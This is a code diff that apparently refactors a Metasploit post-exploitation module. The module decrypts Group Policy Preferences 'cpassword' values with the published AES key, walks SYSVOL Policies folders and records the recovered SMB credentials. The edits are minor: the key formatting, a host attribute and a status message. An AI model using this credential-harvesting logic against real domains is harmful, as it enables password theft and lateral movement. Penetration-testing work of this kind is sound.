@@ -53,11 +53,7 @@ class Metasploit3 < Msf::Post
 	def decrypt(cpassword)
 		# Init the key
 		# From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
-		key = ["
-	4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
-	f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
-	".gsub(" ","").gsub("\n","").gsub("\t","")].to_a.pack("H*")
-
+		key = ["4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"].to_a.pack("H*")
 		cpassword += '='*((4 - cpassword.size.modulo(4)).modulo(4))
 		encoded = Rex::Text.decode_base64(cpassword)
 		# decode
@@ -104,8 +100,8 @@ class Metasploit3 < Msf::Post
 				# parse xml
 				parse_users(temp) do |localuser|
 					## store_creds
-					client.framework.db.report_auth_info(
-						:host  => client.sock.peerhost,
+					framework.db.report_auth_info(
+						:host  => client.session_host,
 						:port  => 445,
 						:sname => 'smb',
 						:user  => localuser.name,
@@ -163,7 +159,7 @@ class Metasploit3 < Msf::Post
 		dirname = "#{server}\\SYSVOL\\"
 		dirsearch = "Policies"
 		begin
-			print_status "[+] Searching #{dirname}"
+			print_good "Searching #{dirname}"
 			dirs = client.fs.dir.foreach(dirname)
 		rescue ::Rex::Post::Meterpreter::RequestError => e
 			print_error("Error reading #{dirname}: #{$!}")
